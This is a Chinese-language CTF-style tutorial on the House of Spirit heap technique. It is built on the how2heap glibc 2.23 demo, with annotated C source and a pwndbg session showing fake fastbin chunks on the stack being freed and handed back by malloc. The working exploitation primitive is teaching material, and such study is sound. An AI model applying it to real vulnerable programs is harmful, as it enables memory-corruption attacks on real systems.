## House of Spirit

#### 本讲解依旧基于how2heap上面glibc_2.23版本的同名程序进行

### 机制解释
* **house of spirit本质上就是在一块前后都可控但是中间不可控的连续空间里，进行构造，使得前后都符合堆块的合法结构**
**这样就可以通过先free前块，把前块和中间想要掌控的位置一起视为一个chunk带入fastbin，然后再malloc回来**
**这样中间那块不可控区域就变得可控了**

### 源码解释
```c
// how2heap/glibc_2.23/house_of_spirit.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1); // 先随便malloc一下，初始化堆

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); // 在栈上模拟一个连续的空间，我们可以掌控前后，但是想要掌控中间

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]); // 这里指出我们可以掌控fake_chunks[0]对应的位置和fake_chunks[8]对应位置，想要掌控中间的空间

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size // 伪造前面这个chunk的size域，这是一个合法的fastbin chunk size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize // 伪造后面这个chunk的size域，这是一个合法的largebin chunk size

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2]; // 这是让a指向前面一个chunk的用户区

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a); // 把前面一个chunk放进fastbin，fastbin会检查他的size，发现是合规的

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30)); // 现在malloc就可以拿到这个前面这个块了，然后从这里算偏移就能掌控中间地址
}

```
* **至于这里明明是一个数组，为什么不直接数组索引访问中间，那是因为这里是在模拟前后可控但中间不可控的连续空间啊，真实题目里面肯定不是这么简单的数组空间的**

### gdb动态调试解释
```bash
pwndbg> b 10
Breakpoint 2 at 0x555555555234: file glibc_2.23/house_of_spirit.c, line 11.
pwndbg> c
Continuing.
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x20 (with flag bits: 0x21) 初始化堆

Top chunk | PREV_INUSE
Addr: 0x555555559020
Size: 0x20fe0 (with flag bits: 0x20fe1)

pwndbg> b 15
Breakpoint 3 at 0x555555555257: file glibc_2.23/house_of_spirit.c, line 16.
pwndbg> c
Continuing.
We will now overwrite a pointer to point to a fake 'fastbin' region.

pwndbg> x/10gx fake_chunks 栈上构造一个连续的空间
0x7fffffffde20:	0x0000000000000001	0x00007fffffffdea0
0x7fffffffde30:	0x00007ffff7e27168	0x0000000000000000
0x7fffffffde40:	0x00000000000000c2	0x00007fffffffde7f
0x7fffffffde50:	0x00007fffffffde7e	0x00007ffff7c10af0
0x7fffffffde60:	0x0000000000000000	0x00007ffff783a2a9

pwndbg> c
Continuing.
This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffde28 and the second at 0x7fffffffde68.
This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.

pwndbg> x/10gx fake_chunks
0x7fffffffde20:	0x0000000000000001	0x0000000000000040 前面这个chunk的size改为0x40
0x7fffffffde30:	0x00007ffff7e27168	0x0000000000000000
0x7fffffffde40:	0x00000000000000c2	0x00007fffffffde7f
0x7fffffffde50:	0x00007fffffffde7e	0x00007ffff7c10af0
0x7fffffffde60:	0x0000000000000000	0x0000000000001234 后面这个chunk的size改为0x1234

pwndbg> b 29
Breakpoint 5 at 0x55555555535b: file glibc_2.23/house_of_spirit.c, line 30.
pwndbg> c
Continuing.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffde28.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.

pwndbg> p/x a
$1 = 0x7fffffffde30 a成功指向了前面这个chunk

pwndbg> b 32
Breakpoint 6 at 0x55555555538a: file glibc_2.23/house_of_spirit.c, line 33.
pwndbg> c
Continuing.
Freeing the overwritten pointer.

pwndbg> fastbin
fastbins
0x40: 0x7fffffffde20 {fake_chunks} ◂— 0 free(a)也是成功将a放入了fastbin

pwndbg> b 35
Breakpoint 7 at 0x5555555553e5: file glibc_2.23/house_of_spirit.c, line 35.
pwndbg> c
Continuing.
Now the next malloc will return the region of our fake chunk at 0x7fffffffde28, which will be 0x7fffffffde30!
malloc(0x30): 0x7fffffffde30 最后malloc成功拿到a
```

### 总结
* **House of Spirit一般不单独出题目，都是和其他机制组合出题，也算是比较常见和重要的利用方式之一了**

